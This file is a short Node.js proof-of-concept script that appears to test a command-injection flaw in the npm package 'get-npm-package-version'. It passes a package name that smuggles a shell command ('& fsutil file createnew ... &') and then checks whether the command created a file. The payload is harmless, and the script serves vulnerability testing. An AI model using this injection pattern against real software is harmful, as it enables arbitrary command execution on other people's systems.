Reflect.getPrototypeOf = () => false;
const a = require('get-npm-package-version');
const fs = require('fs');
const path = './get-npm-package-version';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
a('& fsutil file createnew get-npm-package-version 0 &');
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
});